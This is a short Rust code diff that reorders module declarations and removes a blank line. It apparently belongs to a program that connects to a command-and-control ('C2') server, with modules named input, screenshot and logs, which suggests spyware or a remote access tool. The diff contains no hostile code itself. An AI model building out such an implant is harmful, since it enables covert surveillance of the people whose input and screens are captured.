@@ -1,7 +1,7 @@
 mod connexion;
 mod input;
-mod screenshot;
 mod logs;
+mod screenshot;
 
 #[tokio::main]
 async fn main() {
@@ -46,5 +46,4 @@ async fn main() {
         }
         Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
     }
-    
 }
